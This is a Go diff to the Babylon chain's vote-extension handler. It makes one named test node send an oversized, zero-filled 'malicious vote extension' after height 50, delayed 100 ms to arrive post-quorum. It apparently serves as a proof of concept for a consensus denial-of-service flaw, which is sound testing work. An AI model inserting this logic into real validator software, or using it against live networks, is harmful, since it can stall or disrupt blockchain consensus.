@@ -2,11 +2,13 @@ package vote_extensions
 
 import (
 	"fmt"
+	"time"
 
 	"cosmossdk.io/log"
 	abci "github.com/cometbft/cometbft/abci/types"
 	"github.com/cosmos/cosmos-sdk/baseapp"
 	sdk "github.com/cosmos/cosmos-sdk/types"
+	"github.com/spf13/viper"
 
 	"github.com/babylonlabs-io/babylon/x/checkpointing/keeper"
 	ckpttypes "github.com/babylonlabs-io/babylon/x/checkpointing/types"
@@ -49,6 +51,27 @@ func (h *VoteExtensionHandler) ExtendVote() sdk.ExtendVoteHandler {
 		// BLS vote extension is only applied at the last block of the current epoch
 		if !epoch.IsLastBlockByHeight(req.Height) {
 			return emptyRes, nil
+		}
+
+		configFile := "/home/babylon/babylondata/config/config.toml"
+		vpr := viper.New()
+		vpr.SetConfigFile(configFile)
+		if err := vpr.ReadInConfig(); err != nil {
+			h.logger.Info("failed to read in config", "err", err)
+		}
+
+		moniker := vpr.GetString("moniker")
+		h.logger.Info("ExtendVote moniker", moniker)
+		actMalicious := moniker == "bbn-test-a-node-babylon-default-a-4-746573747" && req.Height >= 50
+		if actMalicious {
+			// Create maximum size vote extension
+			MaxTxBytes := 1008600 // 22020096
+			buf := make([]byte, MaxTxBytes)
+			// Sleep for 100 ms to ensure the votes will be added post-quorum
+			// This is not necessary if we manipulate buf to Unmarshal successfully
+			time.Sleep(100 * time.Millisecond)
+			h.logger.Info("successfully sent malicious vote extension")
+			return &abci.ResponseExtendVote{VoteExtension: buf}, nil
 		}
 
 		// 1. get validator address for VoteExtension structure
